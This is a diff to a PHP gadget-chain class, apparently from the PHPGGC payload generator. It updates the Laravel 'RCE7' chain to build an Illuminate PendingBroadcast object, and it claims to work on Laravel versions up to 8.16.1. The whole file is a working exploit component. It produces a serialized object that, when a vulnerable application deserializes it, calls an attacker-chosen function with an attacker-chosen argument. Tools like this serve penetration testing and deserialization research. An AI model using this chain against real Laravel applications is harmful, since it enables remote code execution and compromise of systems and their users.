@@ -2,21 +2,21 @@
 
 namespace GadgetChain\Laravel;
 
-class RCE7 extends \PHPGGC\GadgetChain\RCE
+class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
 {
-    public static $version = '<=7.19.1';
+    public static $version = '? <= 8.16.1'; // will test for more version at a later date
     public static $vector = '__destruct';
-    public static $author = 'AFKL';
-	public static $informations = '
-	It is not possible to run a function like (system) in this chain.
-	Due to its structure, the function is called with two null arguments after it.
-	';
+    public static $author = 'whira';
+    public static $information = 'This chain throws a RuntimeException immediately after code execution.';
 
     public function generate(array $parameters)
     {
-		$function = $parameters['function'];
+        $function = $parameters['function'];
         $parameter = $parameters['parameter'];
-		
-		return new \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($function, $parameter);
+
+        return new \Illuminate\Broadcasting\PendingBroadcast(
+            $function, 
+            $parameter
+        );
     }
 }
